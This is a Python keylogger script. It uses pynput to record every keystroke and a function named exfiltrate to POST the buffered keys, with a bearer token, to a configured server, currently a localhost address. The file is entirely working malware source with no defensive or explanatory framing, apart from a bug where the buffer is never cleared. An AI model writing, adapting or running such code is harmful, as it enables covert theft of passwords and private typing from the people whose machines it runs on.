import requests
from pynput import keyboard

SERVER_URL = "http://127.0.0.1:8080"
AUTH_TOKEN = "12345"
BUFFER = []
BUFFER_LIMIT = 10

def exfiltrate(data):
    global BUFFER
    if not BUFFER:
        return
    
    try:
        headers = {
            "Authorization": f"Bearer {AUTH_TOKEN}"
        }
        data = "".join(BUFFER)
        response = requests.post(SERVER_URL, data={"keystrokes":data},headers=headers)
        if response.status_code != 200:
            print("Failed to send data")
    except requests.RequestException as e:
        print(f"Error: {e}")


def on_press(key):
    global BUFFER
    try:
        if hasattr(key, 'char') and key.char is not None:
            BUFFER.append(key.char)
        else:
            key_name = str(key).replace("Key.", "")
            BUFFER.append(f"<{key_name}>") 

        if len(BUFFER) >= BUFFER_LIMIT:
            exfiltrate("".join(BUFFER))
    except AttributeError:
        exfiltrate("<" + str(key) + ">")

def on_release(key):
    if key == keyboard.Key.esc:
        exfiltrate("".join(BUFFER))
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()